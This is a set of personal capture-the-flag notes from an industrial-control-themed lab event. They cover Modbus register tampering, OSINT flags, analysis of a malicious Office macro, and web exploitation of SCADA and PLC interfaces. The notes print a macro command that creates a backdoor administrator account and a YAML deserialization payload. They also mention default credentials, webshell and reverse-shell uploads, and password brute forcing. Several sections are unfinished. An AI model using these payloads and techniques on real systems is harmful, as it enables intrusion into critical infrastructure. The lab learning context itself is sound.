# Warm Up/Prep room
## Target
10.10.12.17

## Steps Taken
- The room gave a port and scripts to use against the vulnerable infrastructure.
- I began by first just reading and watching how the system worked
- the first register is used to control the feed pump.
- Once the feed pump was completely full it triggers the Tank Level sensor which is at register 2
- once register 2 is triggered register 3 is also triggered which opens the outlet valve very shortly 13 seconds
- the register 7 stays continueously on then registers 2 and 4 trigger
- then when the first rgeister is triggered again all other registers clear and the reisters tat 2 and 3 are triggered again
- triggering sensor 3 will open the outlet valve completely for about 40 seconds or so
- a counter is incremented on regeister 6
- when register 4 is triggered register 3 is also triggered which opens the outlet valve for about 25 seconds.
- register 8 was set, the surrounding circumstances were that the seperator vessel was about 1/2 way full but then it gets unset not sure what it is doing.
- when register 4 is triggered while register 2 is on it will open the waste water valve
- Register 8 must be a command to release the water valve that is on a timer on a remote machine somewhere.
- When register 9 is triggered register 8 goes off as well as registers 3 and 4
- register 6 seems to be a on off sensor but can store up to value 2
- To bypass all of that, set the 7th register to be 2001 and then claim the flag at http://\<attack-ip\>/flag2.txt
## code design
1. fill the tank
2. wait for the sensor to trigger
3. keep the seperator vessel valve closed


# Additional Information


# OSINT 1

## Objective
NullRook prowls a smart chessboard hub where automation meets strategy. In the digital workshop, subtle flaws in the robot interface threaten to tip the balance of play.

## Target
virelia-water.it.com

## Steps Taken
- First I did a couple digs against the website but that only produced pointers to a github.io site
- Then I put the domain into virustotal which showed that there was a subdomain for the main domain named stage0.virelia-water.it.com which resolves to a solstice-tech1.github.io site
- I was able to find a user that went by the name solstice tech1 on github with two suspicious repositories which I promplty downloaded named staging panel and ot-auth-monitor.
- The staging panel only provided the cannonical name file of the dns record and a phony device login page.
- The ot-auth-monitor panel contained another domain name that was used to harvest credentials. 54484d7b5375357373737d.virelia-water.it.com
- The string is actually a hex encoded string that reveals the flag: THM{Su5sss}

# OSINT 2

## Objective
“Great work on uncovering that suspicious subdomain, Hexline. However, your work here isn’t done yet, we believe there is more.”

## Steps Taken
- Next I decided to take a closer look at the files in the github repos.
- Within the staging-panel-main repository the panel would pull down a javascript respository from the following link: https://raw.githubusercontent.com/SanTzu/uplink-config/refs/heads/main/init.js which included a reference to a fallback dns at uplink-fallback.virelia-water.it.com
- the TXT entry on virus total showed a base64 encoded string 
eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0= which decodes to be the flag of: THM{uplink_channel_confirmed}

# OSINT 3

## Objective
After the initial breach, a single OT-Alert appeared in Virelia’s monthly digest—an otherwise unremarkable maintenance notice, mysteriously signed with PGP. Corporate auditors quietly removed the report days later, fearing it might be malicious. Your mission is to uncover more information about this mysterious signed PGP maintenance message.

## Steps taken
- First I began by searching github for a site mirror of the site hosted at https://virelia-water.it.com
- A github user named virelia-water has a site clone of the virelia-water.it.com site. 
- The information in the github change log showed that there was an old web directory called /contact/.
- One of the git commits showed the old PGP key.
```
iQFQBAEBCgA6FiEEiN7ee3MFE71e3W2fpPD+sISjEeUFAmhZTEQcHGFsZXJ0c0B2
aXJlbGlhLXdhdGVyLml0LmNvbQAKCRCk8P6whKMR5ZIUCADM7F0WpKWWyj4WUdoL
6yrJfJfmUKgJD+8K1neFosG7yaz+MspYxIlbKUek/VFhHZnaG2NRjn6BpfPSxfEk
uvWNIP8rMVEv32vpqhCJ26pwrkAaUHlcPWqM4KYoAn4eEOeHCvxHNJBFnmWI5PBF
pXbj7s6DhyZEHUmTo4JK2OZmiISP3OsHW8O8iz5JLUrA/qw9LCjY8PK79UoceRwW
tJj9pVsE+TKPcFb/EDzqGmBH8GB1ki532/1/GDU+iivYSiRjxWks/ZYPu/bhktTo
NNcOzgEfuSekkQAz+CiclXwEcLQb219TqcS3plnaO672kCV4t5MUCLvkXL5/kHms
Sh5H=jdL7
```
- After preforming a Key lookup using the keys rsa hash I got the flag
`gpg --keyserver hkps://keyserver.ubuntu.com --search-keys 88DEDE7B730513BD5EDD6D9FA4F0FEB084A311E5`
`THM{h0pe_th1s_k3y_doesnt_le4d_t0_m3}`


# Orcam

## Objective
Dr. Ayaka Hirano loves to swim with the sharks. So when the attackers from Virelia successfully retaliated against one of our own, it was up to the good doctor to take on the case. Will Dr. Hirano be able to determine how this attack happened in the first place?

Press the Start Machine button at the top of the task to launch the VM. The VM will start in a split-screen view. If the VM is not visible, then you can press the Show Split View button at the top of the page.

## Steps Taken
- The file provided was an email file which contianed a malicious document with virus total results of:
https://www.virustotal.com/gui/file/21dd0a51f66ab2c829e02bf99bc0bc8674da5994f732688102cfa6dbc626dd53
- The document contained a vbs macro which was found by using binwalk to extract the file at vbaProject.bin
- In order to extract the vbs macro I used oledump.py to dump the contents of the macro.
- The macro contained an array that would be xor decrypted and written to memory on the host machine.
- By deobfuscating the script with python I was able to extract the cmd that was executed in memory adding a new user account
`net user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y & net localgroup administrators administrrator /add`
- The encoded string above was decoded to be THM{Ev1l_M@Cr0}




# Web-1 Brr v1

## Objective

A forgotten HMI node deep in Virelia’s wastewater control loop still runs an outdated instance, forked from an old Mango M2M stack. 

Note: The VM takes about 3 minutes to boot up.
## Scope
10.10.56.116

## Steps Taken
- Results from the initial nmap scan
```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    WebSockify Python/3.12.3
5901/tcp open  vnc     VNC (protocol 3.8)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```
- The webserver on port 8080 hosted an instance of scadabr. I was able to log in with the default credentials admin:admin.
- I was able to use the LinScada_RCE.py which will upload a file to the scadaBR. There is no file type checking so a webshell was able to be uploaded and used to move about the system freely.
- After uploading a reverse shell I was able to get the flag

THM{rce_archieved_through_script_injection}











# Breach
## Objective
Find the flag and open the gate by bypassing the badge authentication system. Find a weakness dig in explore and see what it takes to exploit. Check all open ports.

## Target
10.10.21.60

## Steps Taken
- began nmap scan with the following results
```
Discovered open port 80/tcp on 10.10.15.37
Discovered open port 8080/tcp on 10.10.15.37
Discovered open port 22/tcp on 10.10.15.37
Discovered open port 1880/tcp on 10.10.15.37
Discovered open port 502/tcp on 10.10.15.37

```
- When visiting the website on port 80 a gate status monitor was shown
- When probing the website on port 8080 a login portal was shown
- When running a port scan with service detection on port 1880 a http server was found using node-red that appears to be a function diagram for the badge reader.
- 502 is a known port for ICS and by using the modbus script from previous ICS rooms I was able to start monitoring the communication.
- I tried setting a number of registers to see if anything happened but nothing occured.
- I took a look at the admin pannel login and tried the default credentials for the webpage but they did not work.
- Taking a look at the node red code, when the payload is 20 bits on one of the coils the motion detector is set to be true and this is the same with the other except the value is 25
- The probe did not yield any visible results on the publically facing interface, however a quick `searchsploit` in the command line revealed two vulnerabilities in the OpenPLC web interface.
- It looks like the proof of concept code requires valid credentials on the server.
- The node red instance seems to be up to date as well.
- So the my next step would have been to password spray my way to valid credentials and upload a script.


# Web-2 Persistance

## Objective
After the notorious malware strike on the Virelia Water Control Facility, phantom alerts and erratic sensor readings plague a system that was supposed to be fully remediated.

As a Black Echo red-team specialist, you must penetrate the compromised portal, unravel its hidden persistence mechanism, and neutralise the backdoor before it can be reactivated.


Note: The VM takes about 3 minutes to boot up.
## Scope
10.10.206.97

## Steps Taken
- Initial NMAP scan
```
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```
- Whatweb results
```
http://10.10.240.51 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.240.51], Title[Welcome to nginx!], nginx[1.24.0]


```
- Explored the website and found an update configuration page at /config/update url that accepts YAML.
- When I tried to upload a blank YAML config I get the 403 unauthorized error code as well as submitting a test string.
- Under the logs tab the following is given:
```
2025-06-28T20:04:07 STARTUP CONFIG: {'SIGNATURE': 'secr3tFTW192d2390', 'PLCS': [{'id': 'PLC-101', 'ip': '192.168.10.11'}, {'id': 'PLC-102', 'ip': '192.168.10.12'}], 'SENSORS': [{'name': 'FlowRate', 'unit': 'L/s'}, {'name': 'Pressure', 'unit': 'bar'}]}
2025-06-28T20:04:07 DEBUG: loader script at /opt/hmi/update.py
2025-06-28T20:04:07 DEBUG: webapp script at /opt/hmi/app.py
```
- When viewing the logs the URL included the file name `http://10.10.41.128:8080/logs/view?name=debug.log`
- By changing debug.log to a . I get an internal sever error.
- I started trying to find the update.py and app.py file paths.
- The vulnerability likely has something to do with the yaml file upload.
- There is a known vulnerability that has to do with uploading a yaml configuration with the following test string:
`!!python/object/apply:os.system ["id"]`
- There are also interesting files that can be found at the uri /sensors and 
```
{"datasets":[{"data":[12.53,13.43,16.13,12.92,16.02,16.51,16.35],"label":"FlowRate"},{"data":[1.24,1.35,1.39,1.39,1.44,1.48,1.3],"label":"Pressure"}],"labels":["20:18","20:28","20:38","20:48","20:58","21:08","21:18"]}
```
- My next steps would have been to test the file upload capabilities on the machine in order to get some remote code execution.

# Chess Industry

## Objective
NullRook prowls a smart chessboard hub where automation meets strategy. In the digital workshop, subtle flaws in the robot interface threaten to tip the balance of play.

## Target
10.10.136.15

## Steps Taken
- Initial Nmap scan produced the following:
```
22/tcp open  ssh
79/tcp open  finger
80/tcp open  http
```
- using netcat to probe the port of the finger service produces the following output
`No one logged on.`
- After looking at the main page it seems to say something about automating chess boards and have a section showing which boards are active. After using the finger service to discover the active users of root and Ubuntu I used hydra in conjunction with the rockyou.txt wordlist to start brute forcing my way in.

# OT Kaboom

## Objective
This challenge drops you into the shoes of the APT operator: With a single crafted Modbus, you over-pressurise the main pump, triggering a thunderous blow-out that floods the plant with alarms. While chaos reigns, your partner ghosts through the shaken DMZ and installs a stealth implant, turning the diversion’s echo into your persistent beachhead.

Note: The VM takes about 3 minutes to boot up.

## Target
10.10.39.62

## Steps Taken
- Intitial nmap scan:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

```
- Whatweb results for both web application ports
```
http://10.10.39.62:8080 [302 Found] Cookies[session], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.12.3], HttpOnly[session], IP[10.10.39.62], Python[3.12.3], RedirectLocation[/login], Title[Redirecting...], Werkzeug[2.3.7]                                                                               
http://10.10.39.62:8080/login [200 OK] Cookies[session], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.12.3], HttpOnly[session], IP[10.10.39.62], PasswordField[password], Python[3.12.3], Werkzeug[2.3.7]

http://10.10.39.62:80 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.12.3], IP[10.10.39.62], Python[3.12.3], Script, Title[PLC CCTV Simulator], Werkzeug[3.1.3]
```
- The server has default credentials of openplc:openplc
- The ICS port on 502 has all registers set to zero
- When running one of the scripts it will crash the server entirely. But the blank script will compile and show the following
```
Generating C files...
POUS.c
POUS.h
LOCATED_VARIABLES.h
VARIABLES.csv
Config0.c
Config0.h
Res0.c
Including Siemens S7 Protocol via snap7
Moving Files...
Compiling for Linux
Generating object files...
Generating glueVars...
Compiling main program...
Compilation finished successfully!
```
- I was able to use a script to upload a reverse shell 
- 

# Poision
10.10.21.83
## Objective
The CRM interface on the plant's internal network was supposed to help operators manage sensor maintenance and schedule firmware patches. Instead, someone turned it into a silent threat vector.

A lab technician reported several inconsistencies. Data from the interface showed altered update statuses, injected redirects, and phantom users. Moments later, a batch of remote firmware triggers was misrouted… straight into the wrong PLCs.

Note: The VM takes about 4 minutes to boot up.

## Steps taken
- Initial nmap scan:
```
22/tcp   open  ssh
80/tcp   open  http
5901/tcp open  vnc-1
8000/tcp open  http-alt
8008/tcp open  http
8080/tcp open  http-proxy
```
- Port 80
`http://10.10.21.83:80 [405 Method Not Allowed] Country[RESERVED][ZZ], HTML5, HTTPServer[WebSockify Python/3.12.3], IP[10.10.21.83], Python[3.12.3], Title[Error response]`
- Port 8080
`http://10.10.21.83:8080 [200 OK] Apache[2.4.57], Bootstrap, Content-Security-Policy[default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';,default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';], Cookies[phpMyAdmin,pma_lang], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], HttpOnly[phpMyAdmin,pma_lang], IP[10.10.21.83], JQuery, PHP[8.2.8], PasswordField[pma_password], Script[text/javascript], Title[phpMyAdmin], UncommonHeaders[x-ob_mode,referrer-policy,content-security-policy,x-content-security-policy,x-webkit-csp,x-content-type-options,x-permitted-cross-domain-policies,x-robots-tag], X-Frame-Options[DENY], X-Powered-By[PHP/8.2.8], X-XSS-Protection[1; mode=block], phpMyAdmin`
- Port 8000
`http://10.10.21.83:8000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.19.10], IP[10.10.21.83], PHP[8.0.30], PasswordField[password], Title[Acme Corp Portal], X-Powered-By[PHP/8.0.30], nginx[1.19.10]`
- Port 808
`http://10.10.21.83:8008 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.19.10], IP[10.10.21.83], Title[Welcome to nginx!], nginx[1.19.10]`
### PHP admin site
- When logging in with bogus credentials it gives the following error:
`mysqli::real_connect(): (HY000/1524): Plugin 'mysql_native_password' is not loaded`
- The above error was actually because php my admin had not been touched as of yet.

- The following versions were shown
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.21.83
+ Target Hostname:    10.10.21.83
+ Target Port:        8080
+ Start Time:         2025-06-29 17:49:20 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Debian)
+ /: Retrieved x-powered-by header: PHP/8.2.8.
+ /: Uncommon header 'x-ob_mode' found, with contents: 1.
+ /zaZriqsd.pl|dir: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /README: README file found.
+ /composer.json: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
+ /composer.lock: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
+ /package.json: Node.js package file found. It may contain sensitive information.
+ 8076 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2025-06-29 18:14:29 (GMT-4) (1509 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


### Acme Corp Login panel
- uses PHP on port 8000 for logins
```
└─$ nikto -host http://10.10.21.83:8000
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.21.83
+ Target Hostname:    10.10.21.83
+ Target Port:        8000
+ Start Time:         2025-06-29 18:34:14 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.19.10
+ /: Retrieved x-powered-by header: PHP/8.0.30.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)

```


### VNC application
- The following was the output from an agressive NMAP scan
```
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VeNCrypt (19)
|     VNC Authentication (2)
|   VeNCrypt auth subtypes: 
|     Unknown security type (2)
|_    VNC auth, Anonymous TLS (258)
```
- Connection attempt successfull with the following:
`vncviewer 10.10.21.83::5901`
- Password unknown


# Uninterrupted Problem Supply

## Description
Virelia simply loves buying devices from Mechacore. Their most recent acquisition is a UPS unit. Mechacore promised the login page was 100% secure. Let's see if it can keep us out.

## Target
10.10.139.129

## Steps Taken
- Initial nmap and whatweb results
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


http://10.10.139.129 [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.11.13], IP[10.10.139.129], Python[3.11.13], RedirectLocation[/login], Title[Redirecting...], Werkzeug[3.1.3]
http://10.10.139.129/login [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.11.13], IP[10.10.139.129], PasswordField[password], Python[3.11.13], Title[UPS Login], Werkzeug[3.1.3]

```
- when entering a ' character into the username field of the login form I got the following error:
```
Database error: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
```
- It is possible that there is a way to 



















